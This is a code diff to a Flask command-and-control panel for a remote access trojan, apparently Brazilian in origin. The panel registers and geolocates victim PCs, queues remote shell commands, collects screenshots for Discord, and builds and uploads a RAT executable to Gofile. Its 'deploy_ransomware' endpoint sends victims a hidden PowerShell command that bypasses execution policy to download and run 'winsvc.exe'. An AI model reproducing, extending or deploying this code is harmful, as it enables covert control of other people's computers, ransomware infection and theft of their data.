@@ -1,7 +1,6 @@
 """
-WEB API - Docker com Terminal Interativo e Notificações Real-time
+WEB API - Docker com Terminal Interativo e Notificacoes Real-time
 """
-
 from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit, join_room, leave_room
@@ -33,6 +32,8 @@ logger = logging.getLogger(__name__)
 connected_pcs = {}
 command_queue = {}
 command_results = {}
+terminal_history = {}
+geo_cache = {}
 pc_lock = threading.RLock()
 result_lock = threading.Lock()
 sse_clients = defaultdict(list)
@@ -46,7 +47,7 @@ def save_state():
         with pc_lock, result_lock:
             state = {
                 'pcs': {k: {'status': v.get('status','OFFLINE'), 'last_heartbeat': v.get('last_heartbeat',0),
-                            'registered_at': v.get('registered_at','')} for k, v in connected_pcs.items()},
+                            'registered_at': v.get('registered_at',''), 'ip': v.get('ip','')} for k, v in connected_pcs.items()},
                 'results': command_results
             }
         with open(DATA_FILE, 'w') as f:
@@ -93,6 +94,42 @@ def send_to_discord(pc_name, screenshot_base64):
         logger.error(f"Erro ao enviar para Discord: {e}")
         return False
 
+def lookup_geo(ip):
+    """Geolocation lookup via ip-api.com (free, no key needed)"""
+    if ip in ('127.0.0.1', '::1', 'localhost', ''):
+        return {'country': 'Local', 'countryCode': 'LO', 'flag': '🏠'}
+    if ip in geo_cache:
+        return geo_cache[ip]
+    try:
+        resp = requests.get(f'http://ip-api.com/json/{ip}?fields=country,countryCode', timeout=5)
+        if resp.status_code == 200:
+            data = resp.json()
+            if data.get('status') == 'success':
+                code = data.get('countryCode', '??')
+                flag = ''.join(chr(ord(c) + 127397) for c in code.upper() if c.isalpha())
+                result = {'country': data.get('country', 'Unknown'), 'countryCode': code, 'flag': flag or '🌐'}
+                geo_cache[ip] = result
+                return result
+    except Exception as e:
+        logger.warning(f"[GEO] Lookup failed for {ip}: {e}")
+    return {'country': 'Unknown', 'countryCode': '??', 'flag': '🌐'}
+
+def get_uptime():
+    """Retorna uptime formatado da maquina"""
+    try:
+        boot = datetime.fromtimestamp(psutil.boot_time())
+        delta = datetime.now() - boot
+        days = delta.days
+        hours, rem = divmod(delta.seconds, 3600)
+        mins, secs = divmod(rem, 60)
+        if days > 0:
+            return f"{days}d {hours}h"
+        elif hours > 0:
+            return f"{hours}h {mins}m"
+        return f"{mins}m {secs}s"
+    except:
+        return "N/A"
+
 def cleanup_zombie_pcs():
     """Remove PCs offline por mais de 30s, marca como offline + salva estado"""
     global connected_pcs
@@ -119,11 +156,17 @@ def get_server_metrics():
     try:
         cpu_percent = psutil.cpu_percent(interval=0.1)
         ram = psutil.virtual_memory()
+        disk = psutil.disk_usage('/')
         return {
             'cpu_percent': cpu_percent,
             'ram_percent': ram.percent,
             'ram_used_mb': ram.used / (1024 * 1024),
             'ram_total_mb': ram.total / (1024 * 1024),
+            'disk_percent': disk.percent,
+            'disk_used_gb': disk.used / (1024**3),
+            'disk_total_gb': disk.total / (1024**3),
+            'uptime': get_uptime(),
+            'uptime_seconds': time.time() - psutil.boot_time(),
             'active_connections': len([pc for pc in connected_pcs.values() if pc.get('status') == 'ONLINE']),
             'total_connections': len(connected_pcs),
             'offline_connections': len([pc for pc in connected_pcs.values() if pc.get('status') == 'OFFLINE'])
@@ -148,9 +191,12 @@ def login_page():
         data = request.get_json() or {}
         username = data.get('username', '')
         password = data.get('password', '')
+        remember = data.get('remember', False)
         
         if username == PANEL_USER and password == PANEL_PASS:
             session['authenticated'] = True
+            if remember:
+                session.permanent = True
             return jsonify({"status": "ok"}), 200
         else:
             return jsonify({"error": "Credenciais invalidas"}), 401
@@ -194,29 +240,36 @@ def register_pc():
     try:
         data = request.get_json() or {}
         pc_name = data.get('pc_name', 'Unknown')
+        client_ip = request.remote_addr or '127.0.0.1'
+        
+        geo = lookup_geo(client_ip)
         
         with pc_lock:
             if pc_name not in command_queue:
                 command_queue[pc_name] = []
             if pc_name not in command_results:
                 command_results[pc_name] = []
+            if pc_name not in terminal_history:
+                terminal_history[pc_name] = []
             
             is_new = pc_name not in connected_pcs
             connected_pcs[pc_name] = {
                 'status': 'ONLINE',
                 'last_heartbeat': time.time(),
                 'registered_at': str(datetime.now()),
+                'ip': client_ip,
+                'geo': geo,
                 'watchdog_deployed': connected_pcs[pc_name].get('watchdog_deployed', False) if pc_name in connected_pcs else False
             }
-            logger.info(f"[REGISTER] {pc_name}")
+            logger.info(f"[REGISTER] {pc_name} ({client_ip}) - {geo.get('country','?')}")
         
         broadcast_pc_update()
-        broadcast_notification('success', 'PC Conectado', f'{pc_name} se conectou ao painel', pc_name)
+        broadcast_notification('success', 'PC Conectado', f'{pc_name} se conectou ao painel ({geo.get("country","?")})', pc_name)
         
         if is_new or not connected_pcs[pc_name].get('watchdog_deployed'):
             threading.Thread(target=_deploy_watchdog_bg, args=(pc_name,), daemon=True).start()
         
-        return jsonify({"status": "registered", "pc_name": pc_name})
+        return jsonify({"status": "registered", "pc_name": pc_name, "geo": geo})
     except Exception as e:
         logger.error(f"[REGISTER] Erro ao registrar PC: {e}")
         return jsonify({"status": "error", "message": str(e)}), 500
@@ -256,7 +309,9 @@ def heartbeat():
             connected_pcs[pc_name] = {
                 'status': 'ONLINE',
                 'last_heartbeat': time.time(),
-                'registered_at': str(datetime.now())
+                'registered_at': str(datetime.now()),
+                'ip': request.remote_addr or '',
+                'geo': {'country': '?', 'countryCode': '??', 'flag': '🌐'}
             }
         else:
             connected_pcs[pc_name]['status'] = 'ONLINE'
@@ -284,15 +339,80 @@ def get_pcs():
         for pc_name, info in list(connected_pcs.items()):
             if not pc_name or not info:
                 continue
+            current_time = time.time()
+            last_hb = info.get('last_heartbeat', 0)
+            offline_time = current_time - last_hb if last_hb else 9999
+            
+            if info.get('status') == 'ONLINE' and offline_time < 10:
+                status = 'ONLINE'
+            elif info.get('status') == 'ONLINE' and offline_time < 30:
+                status = 'IDLE'
+            elif info.get('status') == 'ONLINE' and offline_time >= 30:
+                status = 'OFFLINE'
+            else:
+                status = info.get('status', 'NEVER')
+            
             pcs_info.append({
                 'name': pc_name,
-                'status': info.get('status', 'UNKNOWN'),
+                'status': status,
                 'last_heartbeat': info.get('last_heartbeat'),
-                'registered_at': info.get('registered_at')
+                'registered_at': info.get('registered_at'),
+                'ip': info.get('ip', ''),
+                'geo': info.get('geo', {}),
+                'offline_time': round(offline_time, 1) if last_hb else None
             })
     
     logger.info(f"[API] GET /api/pcs: {len(pcs_info)} PCs retornados")
     return jsonify({"pcs": pcs_info, "count": len(pcs_info)})
+
+@app.route('/api/stats', methods=['GET', 'OPTIONS'])
+@require_login
+def get_stats():
+    """Retorna estatisticas completas do servidor (CPU, RAM, DISK, UPTIME)"""
+    if request.method == 'OPTIONS':
+        return '', 204
+    return jsonify(get_server_metrics())
+
+@app.route('/api/metrics', methods=['GET'])
+@require_login
+def get_metrics():
+    return jsonify(get_server_metrics())
+
+@app.route('/api/terminal_history/<pc_name>', methods=['GET'])
+@require_login
+def get_terminal_history(pc_name):
+    """Retorna historico dos ultimos comandos enviados para um PC"""
+    with pc_lock:
+        history = terminal_history.get(pc_name, [])[-20:]
+    return jsonify({"pc_name": pc_name, "history": history})
+
+@app.route('/api/kill_all', methods=['POST'])
+@require_login
+def kill_all():
+    """Envia !shutdown para todos os PCs ONLINE/IDLE"""
+    with pc_lock:
+        current_time = time.time()
+        killed = []
+        for pc_name, info in list(connected_pcs.items()):
+            if info.get('status') == 'ONLINE':
+                last_hb = info.get('last_heartbeat', 0)
+                if current_time - last_hb < 30:
+                    if pc_name not in command_queue:
+                        command_queue[pc_name] = []
+                    command_queue[pc_name].append('!shutdown')
+                    killed.append(pc_name)
+                    if pc_name not in terminal_history:
+                        terminal_history[pc_name] = []
+                    terminal_history[pc_name].append({
+                        'timestamp': datetime.now().strftime('%H:%M:%S'),
+                        'command': '!shutdown',
+                        'type': 'mass_kill'
+                    })
+        
+        logger.info(f"[KILL_ALL] Shutdown enviado para {len(killed)} PCs: {killed}")
+        broadcast_notification('warning', 'Kill All', f'Shutdown enviado para {len(killed)} PCs', None)
+    
+    return jsonify({"status": "done", "killed": len(killed), "pcs": killed})
 
 @app.route('/api/command', methods=['POST'])
 @require_login
@@ -309,6 +429,16 @@ def send_command():
             if pc_name not in command_queue:
                 command_queue[pc_name] = []
             command_queue[pc_name].append(command)
+            
+            if pc_name not in terminal_history:
+                terminal_history[pc_name] = []
+            terminal_history[pc_name].append({
+                'timestamp': datetime.now().strftime('%H:%M:%S'),
+                'command': command,
+                'type': 'api'
+            })
+            if len(terminal_history[pc_name]) > 50:
+                terminal_history[pc_name] = terminal_history[pc_name][-50:]
         
         logger.info(f"[COMMAND] {pc_name}: {command}")
         broadcast_notification('info', 'Comando Enfileirado', f'{command[:40]}... → {pc_name}', pc_name)
@@ -326,7 +456,7 @@ def get_screenshot(pc_name):
         screenshot_file = os.path.join(screenshots_dir, f"screenshot_{pc_name}.png")
         
         if not os.path.exists(screenshot_file):
-            logger.warning(f"[SCREENSHOT] Arquivo não encontrado: {screenshot_file}")
+            logger.warning(f"[SCREENSHOT] Arquivo nao encontrado: {screenshot_file}")
             return jsonify({"error": "Screenshot nao disponivel"}), 404
         
         with open(screenshot_file, 'rb') as f:
@@ -343,7 +473,6 @@ def get_screenshot(pc_name):
         return jsonify({"error": str(e)}), 500
 
 @app.route('/api/screenshot_capture/<pc_name>', methods=['POST'])
-# @require_login  <-- REMOVED to allow client to upload
 def capture_screenshot(pc_name):
     """Captura screenshot, salva arquivo e envia para Discord"""
     try:
@@ -378,35 +507,29 @@ def receive_result():
     """Recebe resultado de comandos do cliente"""
     try:
         data = request.get_json() or {}
-        # Support both formats: direct result or command_id based
         pc_name = data.get('pc_name')
         result_text = data.get('result')
-        command_id = data.get('command_id') # Optional, for future use
+        command_id = data.get('command_id')
         
         if not pc_name or not result_text:
-             # Try legacy/alternative format if needed
              if command_id and result_text:
-                 # TODO: Link command_id to pc_name if possible, for now ignore
-                 pass
+                  pass
              return jsonify({"status": "ignored", "reason": "missing_data"}), 400
 
         with result_lock:
             if pc_name not in command_results:
                 command_results[pc_name] = []
             
-            # Store with timestamp
             command_results[pc_name].append({
                 "timestamp": str(datetime.now()),
                 "content": result_text
             })
             
-            # Keep only last 50 results
             if len(command_results[pc_name]) > 50:
                 command_results[pc_name] = command_results[pc_name][-50:]
 
         logger.info(f"[RESULT] {pc_name}: {result_text[:50]}...")
         
-        # Notify via SocketIO
         socketio.emit('command_result', {
             'pc_name': pc_name,
             'result': result_text
@@ -420,10 +543,8 @@ def receive_result():
 @app.route('/api/results/<pc_name>', methods=['GET'])
 @require_login
 def get_results(pc_name):
-    """Retorna ultimos resultados do PC"""
     with result_lock:
         results = command_results.get(pc_name, [])
-        # Return reversed (newest first)
         return jsonify({"results": results[::-1]})
 
 @app.route('/api/execute', methods=['POST'])
@@ -484,18 +605,10 @@ def file_manager(action):
     logger.info(f"[FILES] {pc_name}: {action} {path}")
     return jsonify({"status": f"files_{action}"})
 
-@app.route('/api/metrics', methods=['GET'])
-@require_login
-def get_metrics():
-    """Retorna metricas do servidor em tempo real"""
-    metrics = get_server_metrics()
-    return jsonify(metrics)
-
 DISCORD_CHANNEL_ID = 1513378963727187968
 DISCORD_TOKEN = os.environ.get('DISCORD_TOKEN', '')
 
 def upload_to_gofile(file_path):
-    """Upload exe to Gofile, return download link"""
     import requests as req
     try:
         with open(file_path, 'rb') as f:
@@ -508,7 +621,6 @@ def upload_to_gofile(file_path):
     return None
 
 def send_discord_link_sync(gofile_url, file_path):
-    """Envia link do Gofile pro canal do Discord (sync)"""
     try:
         if not DISCORD_TOKEN:
             logger.warning("[DISCORD] Token nao configurado")
@@ -531,30 +643,26 @@ def send_discord_link_sync(gofile_url, file_path):
 @app.route('/api/crypt/<pc_name>', methods=['POST'])
 @require_login
 def deploy_ransomware(pc_name):
-    """Envia ransomware para vitima: upload Gofile → download → executa"""
     from pathlib import Path
     dist_dir = Path(app.root_path) / 'dist'
     wd_path = dist_dir / 'winsvc.exe'
     
     if not wd_path.exists():
-        # Also check in the root (ransomware dir)
         root_wd = Path(app.root_path) / '..' / '..' / 'dist' / 'winsvc.exe'
         if root_wd.exists():
             wd_path = root_wd
         else:
             return jsonify({"error": "winsvc.exe nao encontrado. Compile o ransomware primeiro."}), 404
     
-    # Upload to Gofile
     try:
         gofile_link = upload_to_gofile(str(wd_path))
     except:
         gofile_link = None
     
-    # Build command: download from gofile (or panel) and execute
     if gofile_link:
         dl_url = gofile_link
     else:
-        dl_url = f"http://{request.host}/api/watchdog"  # reuse watchdog endpoint
+        dl_url = f"http://{request.host}/api/watchdog"
         
     ps_cmd = (
         f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
@@ -580,7 +688,6 @@ def deploy_ransomware(pc_name):
 
 @app.route('/api/build', methods=['POST'])
 def build_rat_exe():
-    """Retorna RAT.exe compilado. Envia link pro Discord automaticamente."""
     try:
         import os
         import subprocess
@@ -613,10 +720,9 @@ def build_rat_exe():
         
         if not dist_path.exists():
              return jsonify({
-                "error": f"raiox.scr nao encontrado em {dist_path} mesmo após tentativa de build."
+                "error": f"raiox.scr nao encontrado em {dist_path} mesmo apos tentativa de build."
             }), 404
         
-        # Upload to Gofile + send Discord link (sync)
         try:
             gofile_link = upload_to_gofile(str(dist_path))
             if gofile_link:
@@ -635,7 +741,6 @@ def build_rat_exe():
 @app.route('/api/watchdog_url', methods=['POST'])
 @require_login
 def set_watchdog_url():
-    """Define a URL publica do watchdog (Gofile)"""
     global WATCHDOG_URL
     data = request.get_json() or {}
     url = data.get('url', '')
@@ -648,7 +753,6 @@ def set_watchdog_url():
 
 @app.route('/api/watchdog', methods=['GET'])
 def download_watchdog():
-    """Serve o watchdog.exe compilado ou o .py source"""
     from pathlib import Path
     dist_dir = Path(app.root_path) / 'dist'
     
@@ -666,7 +770,6 @@ def download_watchdog():
 @app.route('/api/download', methods=['GET'])
 @require_login
 def download_exe():
-    """Download direto do ultimo .exe compilado"""
     from pathlib import Path
     dist_dir = Path(app.root_path) / 'dist'
     candidates = list(dist_dir.glob('raiox*'))
@@ -679,7 +782,6 @@ def download_exe():
 
 @socketio.on('terminal_connect')
 def on_terminal_connect(data):
-    """Cliente conecta ao terminal"""
     pc_name = data.get('pc_name')
     if not pc_name:
         emit('error', {'message': 'PC name requerido'})
@@ -691,7 +793,6 @@ def on_terminal_connect(data):
 
 @socketio.on('terminal_command')
 def on_terminal_command(data):
-    """Recebe comando do terminal para executar"""
     pc_name = data.get('pc_name')
     command = data.get('command', '').strip()
     
@@ -703,6 +804,16 @@ def on_terminal_command(data):
         if pc_name not in command_queue:
             command_queue[pc_name] = []
         command_queue[pc_name].append(command)
+        
+        if pc_name not in terminal_history:
+            terminal_history[pc_name] = []
+        terminal_history[pc_name].append({
+            'timestamp': datetime.now().strftime('%H:%M:%S'),
+            'command': command,
+            'type': 'terminal'
+        })
+        if len(terminal_history[pc_name]) > 50:
+            terminal_history[pc_name] = terminal_history[pc_name][-50:]
     
     logger.info(f"[TERMINAL] {pc_name}: {command}")
     emit('command_sent', {'command': command, 'timestamp': str(datetime.now())})
@@ -714,24 +825,38 @@ def on_terminal_command(data):
 
 @socketio.on('terminal_disconnect')
 def on_terminal_disconnect(data):
-    """Cliente desconecta do terminal"""
     pc_name = data.get('pc_name')
     if pc_name:
         leave_room(f'terminal_{pc_name}')
         logger.info(f"[TERMINAL] Cliente desconectado de {pc_name}")
 
 def broadcast_pc_update():
-    """Notifica todos os clientes do painel sobre mudanças na lista de PCs"""
     try:
         with pc_lock:
+            current_time = time.time()
             pcs_info = []
             for pc_name, info in connected_pcs.items():
                 if pc_name and info:
+                    last_hb = info.get('last_heartbeat', 0)
+                    offline_time = current_time - last_hb if last_hb else 9999
+                    
+                    if info.get('status') == 'ONLINE' and offline_time < 10:
+                        status = 'ONLINE'
+                    elif info.get('status') == 'ONLINE' and offline_time < 30:
+                        status = 'IDLE'
+                    elif info.get('status') == 'ONLINE' and offline_time >= 30:
+                        status = 'OFFLINE'
+                    else:
+                        status = info.get('status', 'NEVER')
+                    
                     pcs_info.append({
                         'name': pc_name,
-                        'status': info.get('status', 'UNKNOWN'),
+                        'status': status,
                         'last_heartbeat': info.get('last_heartbeat'),
-                        'registered_at': info.get('registered_at')
+                        'registered_at': info.get('registered_at'),
+                        'ip': info.get('ip', ''),
+                        'geo': info.get('geo', {}),
+                        'offline_time': round(offline_time, 1) if last_hb else None
                     })
         socketio.emit('pc_update', {
             'pcs': pcs_info,
@@ -741,7 +866,6 @@ def broadcast_pc_update():
         logger.error(f"[PC_UPDATE] Erro ao emitir pc_update: {e}")
 
 def broadcast_notification(notification_type, title, message, pc_name=None):
-    """Envia notificação em tempo real para todos os clientes"""
     try:
         socketio.emit('notification', {
             'type': notification_type,
@@ -751,7 +875,7 @@ def broadcast_notification(notification_type, title, message, pc_name=None):
             'timestamp': str(datetime.now())
         })
     except Exception as e:
-        logger.error(f"[NOTIF] Erro ao enviar notificação: {e}")
+        logger.error(f"[NOTIF] Erro ao enviar notificacao: {e}")
 
 if __name__ == '__main__':
     load_state()
